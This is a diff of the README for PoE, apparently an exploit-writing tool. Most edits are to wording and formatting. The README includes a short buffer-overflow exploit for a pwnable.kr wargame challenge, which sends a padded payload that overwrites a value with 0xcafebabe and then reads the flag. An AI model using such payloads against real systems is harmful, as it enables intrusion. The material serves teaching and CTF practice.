@@ -44,8 +44,8 @@ machine. If so, you are all set.
 
 ### From source code
 
-Instead of running the command `poe` to use the released version of PoE, you can
-also clone the latest source code of PoE and run it:
+Instead of running the released version of PoE, you can also clone the latest
+source code of PoE and run it directly:
 ```
 git clone https://github.com/B2R2-org/PoE
 cd PoE
@@ -59,12 +59,12 @@ Basically, PoE supports two modes to interact with the target system:
 + Remote mode: It communicates with the remote service running on the specific
 IP address and port number.
 
-You can use either Local mode or Remote mode via the following commands:
+You can use either **Local mode** or **Remote mode** via the following commands:
 
 + Local mode: `poe stdin [replay options] <PoE> <bin path> [args]`
 + Remote mode: `poe net [replay options] <PoE> <ip> <port>`
 
-Also, we provide another way to connect to the remote service via SSH mode,
+Also, we provide another way to connect to the remote service via **SSH mode**,
 where you can specify the username and password to log in to the remote host via
 SSH:
 
@@ -81,8 +81,8 @@ you can easily write its exploit via PoE:
 
 ```
 act exploit():
-    write("nc 0 9000\n")
     bv payload = "A"x(0x2c + 0x8) . 0xcafebabe:u32 . "\n"
+    write("nc 0 9000\n")
     write(payload)
     write("cat flag\n")
     return read(-1)
@@ -96,7 +96,7 @@ service:
 ```
 poe ssh bof.poe pwnable.kr 9000 bof guest
 ```
-Note that you can also use Remote (`net`) mode when you connect to the remote
+Note that you can also use Remote mode (`net`) when you connect to the remote
 service using the other ways (e.g. via `nc`).
 
 For more details, please see the [tutorial](tutorial).
